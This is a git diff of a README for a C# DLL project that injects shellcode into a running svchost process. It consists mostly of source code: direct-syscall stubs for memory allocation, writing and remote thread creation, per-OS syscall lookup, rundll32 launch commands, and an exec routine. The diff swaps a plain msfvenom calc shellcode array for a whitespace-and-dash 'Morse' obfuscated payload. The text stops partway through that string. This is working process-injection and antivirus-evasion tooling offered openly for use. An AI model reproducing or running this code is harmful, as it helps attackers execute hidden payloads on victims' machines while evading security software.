@@ -1,14 +1,25 @@
 # ExecuteShellcodeWithSyscalls
 Execute shellcode with syscalls from C# .dll
 
-Compile with csc.exe and insert entrypoint exec. As time writing this only support Windows 10 Build 1903 and 1909 more to come.
+Compile with csc.exe (https://github.com/mobdk/compilecs) and insert entrypoint exec. As time writing this support Windows 10 1803/17134 1809/17763	1903/18362 1909/18363, servers can be added. 
 
 For finding syscalls identifer goto https://j00ru.vexillium.org/syscalls/nt/64/
 
 This PoC execute calc.exe. I recommend  https://github.com/monoxgas/sRDI/blob/master/PowerShell/ConvertTo-Shellcode.ps1 for
 converting C coded .dll into shellcode, works both with 32/64bit
 
+Execution example:
+
+Ordinal number:
+rundll32 syscalls.dll,#1
+
+Entrypoint exec:
+rundll32 syscalls.dll,exec
+
+syscalls.cs:
+
 ```
+
 using System;
 using System.Security;
 using System.Diagnostics;
@@ -18,6 +29,15 @@ using System.Management;
 using System.Security.Principal;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Security.Permissions;
+using Microsoft.Win32.SafeHandles;
+using System.Linq;
+using System.Reflection;
+using System.Security.AccessControl;
+using System.Text;
+using System.Threading;
+
+
 
 
 public class Code
@@ -115,6 +135,9 @@ public class Code
     public const int FILE_READ_ONLY_VOLUME = 0x00080000;
     public const int CREATE_ALWAYS = 2;
     public const uint GENERIC_ALL = 0x1FFFFF;
+    const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
+    const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
+    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
 
     [StructLayout(LayoutKind.Sequential, Pack = 4)]
     public struct NtCreateThreadExBuffer
@@ -539,6 +562,62 @@ public class Code
         MaximumNtStatus = 0xffffffff
 };
 
+    [Flags]
+    public enum MemoryProtection : uint
+    {
+        AccessDenied = 0x0,
+        Execute = 0x10,
+        ExecuteRead = 0x20,
+        ExecuteReadWrite = 0x40,
+        ExecuteWriteCopy = 0x80,
+        Guard = 0x100,
+        NoCache = 0x200,
+        WriteCombine = 0x400,
+        NoAccess = 0x01,
+        ReadOnly = 0x02,
+        ReadWrite = 0x04,
+        WriteCopy = 0x08,
+        //SEC_NO_CHANGE = 0x00400000
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFO
+    {
+        public Int32 cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public Int32 dwX;
+        public Int32 dwY;
+        public Int32 dwXSize;
+        public Int32 dwYSize;
+        public Int32 dwXCountChars;
+        public Int32 dwYCountChars;
+        public Int32 dwFillAttribute;
+        public Int32 dwFlags;
+        public Int16 wShowWindow;
+        public Int16 cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFOEX
+    {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
@@ -546,170 +625,248 @@ public class Code
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
-    public static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
-
     [DllImport("ntdll.dll", SetLastError = true)]
-    public static extern bool RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);
+    public static extern bool ZwOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [SuppressUnmanagedCodeSecurity]
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);
+
+    [DllImport("ntdll.dll")]
+    public static extern NTSTATUS ZwProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool InitializeProcThreadAttributeList( IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UpdateProcThreadAttribute( IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwOpenProcessX(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwCreateThreadExX(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwCreateSectionX(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwMapViewOfSectionX(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwProtectVirtualMemoryX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwCreateProcessX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwOpenThreadX( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
+
+    [SuppressUnmanagedCodeSecurity]
+    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+    public delegate NTSTATUS ZwResumeThreadX( IntPtr threadHandle, out ulong SuspendCount);
+
 
     public static NTSTATUS ZwOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x26 /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 1 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.ZwOpenProcess ZwOpenProcessFunc = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.ZwOpenProcess));
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwOpenProcessX ZwOpenProcessFunc = (ZwOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenProcessX));
                 return (NTSTATUS)ZwOpenProcessFunc(out hProcess, processAccess, objAttribute, ref clientid);
             }
-        }
-   }
 
-    public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
+        }
+    }
+
+    public static NTSTATUS ZwCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0xBD /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 2 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.NtCreateThreadEx NtCreateThreadExFunc = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.NtCreateThreadEx));
-                return (NTSTATUS)NtCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwCreateThreadExX ZwCreateThreadExFunc = (ZwCreateThreadExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateThreadExX));
+                return (NTSTATUS)ZwCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
             }
         }
     }
 
     public static NTSTATUS ZwWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x3A /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.ZwWriteVirtualMemory ZwWriteVirtualMemoryFunc = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.ZwWriteVirtualMemory));
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                 return (NTSTATUS)ZwWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
             }
         }
     }
 
 
-    public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
+    public static NTSTATUS ZwAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x18 /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemoryFunc = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.NtAllocateVirtualMemory));
-                return (NTSTATUS)NtAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwAllocateVirtualMemoryX ZwAllocateVirtualMemoryFunc = (ZwAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwAllocateVirtualMemoryX));
+                return (NTSTATUS)ZwAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
             }
         }
     }
 
-    public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
+    public static NTSTATUS ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x4A /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 5 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.NtCreateSection NtCreateSectionFunc = (Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.NtCreateSection));
-                return (NTSTATUS)NtCreateSectionFunc(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwCreateSectionX ZwCreateSectionFunc = (ZwCreateSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateSectionX));
+                return (NTSTATUS)ZwCreateSectionFunc(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
             }
         }
     }
 
-    public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
+    public static NTSTATUS ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x28 /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 6 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.NtMapViewOfSection NtMapViewOfSectionFunc = (Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.NtMapViewOfSection));
-                return (NTSTATUS)NtMapViewOfSectionFunc(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwMapViewOfSectionX ZwMapViewOfSectionFunc = (ZwMapViewOfSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwMapViewOfSectionX));
+                return (NTSTATUS)ZwMapViewOfSectionFunc(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
             }
         }
     }
 
-    public static NTSTATUS RtlGetVersion(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
+    public static NTSTATUS ZwCreateProcess( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort)
     {
-        byte[] syscall = { 0x49, 0x89, 0xCA, 0xB8, 0x3A /* <-- syscall identifier */, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 7 );
         unsafe
         {
             fixed (byte* ptr = syscall)
             {
                 IntPtr allocMemAddress = (IntPtr)ptr;
-                uint oldprotect;
-                bool result = VirtualProtectEx(Process.GetCurrentProcess().Handle, allocMemAddress, (UIntPtr)syscall.Length, PAGE_EXECUTE_READWRITE, out oldprotect);
-                Delegates.ZwWriteVirtualMemory ZwWriteVirtualMemoryFunc = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(allocMemAddress, typeof(Delegates.ZwWriteVirtualMemory));
-                return (NTSTATUS)ZwWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwCreateProcessX ZwCreateProcessFunc = (ZwCreateProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateProcessX));
+                return (NTSTATUS)ZwCreateProcessFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort);
             }
         }
     }
 
-
-    public struct Delegates
+    public static NTSTATUS ZwOpenThread( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
     {
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);
+        byte [] syscall = GetOSVersionAndReturnSyscall( 8 );
+        unsafe
+        {
+            fixed (byte* ptr = syscall)
+            {
+                IntPtr allocMemAddress = (IntPtr)ptr;
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwOpenThreadX ZwOpenThreadFunc = (ZwOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwOpenThreadX));
+                return (NTSTATUS)ZwOpenThreadFunc(threadHandle, processAccess, objAttribute, ref clientid);
+            }
 
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
-
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);
-
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int NtCreateThreadEx(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);
-
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);
-
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
-
-        [SuppressUnmanagedCodeSecurity]
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        public delegate int NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
+        }
     }
 
-
-
-    public static int exec()
+    public static NTSTATUS ZwResumeThread( IntPtr threadHandle, out ulong SuspendCount)
     {
-        int ProcId = FindUserPID("svchost");
-        // shellcode = msfvenom --payload windows/x64/exec CMD="calc" EXITFUNC=thread -f csharp
-        byte[] shellcode = new byte[272] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 };
+        byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
+        unsafe
+        {
+            fixed (byte* ptr = syscall)
+            {
+                IntPtr allocMemAddress = (IntPtr)ptr;
+                IntPtr allocMemAddressCopy = (IntPtr)ptr;
+                MemoryProtection oldProtection;
+                uint size = (uint)syscall.Length;
+                IntPtr sizeIntPtr = (IntPtr)size;
+                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
+                ZwResumeThreadX ZwResumeThreadFunc = (ZwResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwResumeThreadX));
+                return (NTSTATUS)ZwResumeThreadFunc(threadHandle, out SuspendCount);
+            }
+
+        }
+    }
+
+    public static void exec()
+    {
+        // name = svchost
+        string name = "                   ?                      ?   ?        ?               ?                   ?                    ?";
+        // Morse is shellcode, start calc
+        string Morse = "-/    /         ?  /-/ ?-/       /  ? /  /         ?  /   /   ?  /  /  ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /    / ?-/-/     ?  /   /         ?  /     /     ?  /     /     ?  /     /     ?-/       /  ? /        /       ?  / /     ?  / /       ? /         /      ?-/         /     ?-/     /    ?  /-/      ? /   /        ?  /     /  ?-/       /  ?-/    /         ?-/        /        ?-/   /         ?-/       /  ?-/    /     ?  /    /        ?  /     /     ?  /     /     ?  /     /     ?  /  /      ?  /    /    ?-/    /   ? /    /     ?-/       / ? /        /       ? /         /        ?-/   /        ?-/       /    ?  /     /  ?  / /     ?  / /       ? /   /   ?-/ /    ? / /         ? /     /        ?  / /      ? /       /   ? /  /         ? /    /     ?  /    /     ? /    / ?-/        /   ? /   /    ?-/-/ ? /       /    ? /        /   ? /    /     ?-/       /         ?-/ /   ?-/    /      ? /   /    ?-/-/ ? /       /    ?  /    /       ? /    /     ?-/       /         ?-/    /     ? /-/  ? /   /    ? /   /   ?-/       /     ? /     /       ? /    /       ? /   /       ? / /-?  /     /     ? /   /    ? /        /       ?-/      /-? /  /   ?  /  /      